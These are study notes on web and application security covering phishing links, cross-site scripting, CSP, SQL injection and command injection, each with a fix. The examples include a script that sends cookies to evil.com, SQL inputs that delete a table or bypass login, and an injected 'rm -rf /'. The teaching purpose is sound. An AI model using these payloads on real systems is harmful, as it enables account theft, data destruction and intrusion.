# Securing Software

> **Series:** [[01 - Protecting Accounts]] · [[02 - Protecting Data]] · [[03 - Cryptography]] · [[04 - Securing Systems]] · [[05 - Malware & Threats]] · [[06 - Securing Software]]

---

## Navigation
- [[#Zero Day Attack]]
- [[#Security is Layered]]
- [[#Phishing via HTML]]
- [[#Cross-Site Scripting (XSS)]]
- [[#Character Escaping]]
- [[#Content Security Policy (CSP)]]
- [[#SQL Injection]]
- [[#Command Injection]]

---

## Zero Day Attack

> An exploit discovered and weaponized **before the vendor knows it exists.**

- Attacker writes a worm exploiting an unknown vulnerability
- Spreads before companies can patch, respond, or even understand it
- Called "zero day" because defenders have had zero days to fix it

---

## Security is Layered

> No single tool makes a system secure. Security is **defense in depth** — multiple overlapping layers.

- Antivirus alone is not enough
- HTTPS alone is not enough
- A breach in one layer should not mean total compromise

---

## Phishing via HTML

An `<a>` tag has two parts — the **visible name** and the **actual URL**:

```html
<a href="https://evil.com">https://harvard.edu</a>
```

- User sees `https://harvard.edu`
- Clicking goes to `https://evil.com`

Attackers also **download legitimate-looking pages** locally and host them — same visual appearance, different backend.

---

## Cross-Site Scripting (XSS)

> Injecting malicious scripts into a page that other users' browsers then execute.

Happens when user input is rendered directly into HTML without sanitization.

### Reflected XSS

Input is reflected back in the page immediately (e.g. search results).

Malicious search URL:
```
https://example.com/search?q=<script>alert('attack')</script>
```

URL-encoded version (what it looks like in a link):
```
https://example.com/search?q=%3Cscript%3Ealert%28%27attack%27%29%3C%2Fscript%3E
```

User clicks thinking it searches for "cats" — the script executes instead.

Real payloads don't just `alert()` — they steal:
```javascript
<script>
  fetch('https://evil.com?c=' + document.cookie)
</script>
```

---

### Stored XSS

Script is **saved to the server** (e.g. in a message, comment, or email body).

- Attacker sends a message containing the script
- Server stores it
- Every time a recipient opens that message, the script executes
- More dangerous than reflected — one payload, many victims

**Fix:** Never render raw user input as HTML. Display it as text.

---

## Character Escaping

> Convert special characters into their safe HTML equivalents so browsers render them as text, not code.

| Character | Escaped |
|-----------|---------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&apos;` |

So `<script>alert()</script>` becomes:
```
&lt;script&gt;alert()&lt;/script&gt;
```

Displayed as text — never executed.

> Use your framework's built-in escaping. Don't write your own.

---

## Content Security Policy (CSP)

HTTP response header that tells the browser **what it's allowed to execute**.

### Block all inline scripts — only allow from external file:
```http
Content-Security-Policy: script-src https://example.com
```

- Inline `<script>` tags → blocked
- `<script src="https://example.com/app.js">` → allowed

### Same for CSS:
```http
Content-Security-Policy: style-src https://example.com
```

- Inline `style=` attributes → blocked
- `<link href="https://example.com/style.css" rel="stylesheet">` → allowed

> Even if an attacker injects a `<script>` tag, CSP prevents the browser from running it.

---

## SQL Injection

> Injecting SQL code into user input fields that gets executed as part of a database query.

### Dynamic Query — Vulnerable

```sql
SELECT * FROM users
WHERE username = '{username}'
```

Attacker input:
```
malan'; DELETE FROM users; --
```

Resulting query:
```sql
SELECT * FROM users
WHERE username = 'malan'; DELETE FROM users; --'
```

- `'` closes the string
- `DELETE FROM users` executes as code
- `--` comments out the remaining `'`

---

### Login Bypass

```sql
SELECT * FROM users
WHERE username = '{username}' AND password = '{password}'
```

Attacker input:
```json
{
  "username": "alex",
  "password": "' OR '1'='1"
}
```

Resulting query:
```sql
SELECT * FROM users
WHERE username = 'alex' AND password = '' OR '1'='1'
```

`'1'='1'` is always true → login succeeds for any account.

---

### Fix — Prepared Statements

Never build queries with raw string concatenation. Use **parameterized/prepared statements**.

```java
// JDBC example
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
stmt.setString(1, username);
stmt.setString(2, password);
```

- The DB treats `?` values as **data only**, never as SQL code
- `'` is escaped automatically as `''`
- Do not reinvent this — every major DB library already has it built in

---

## Command Injection

> Injecting system-level commands through functions that execute shell or OS operations.

Dangerous functions: `system()`, `exec()`, `eval()`

Example — if user input flows into a shell call:
```python
os.system("ping " + user_input)
```

Attacker input: `google.com; rm -rf /`

Resulting call:
```bash
ping google.com; rm -rf /
```

**Fix:** Every language has a safe API for this. Use it — don't pass raw user input to shell commands.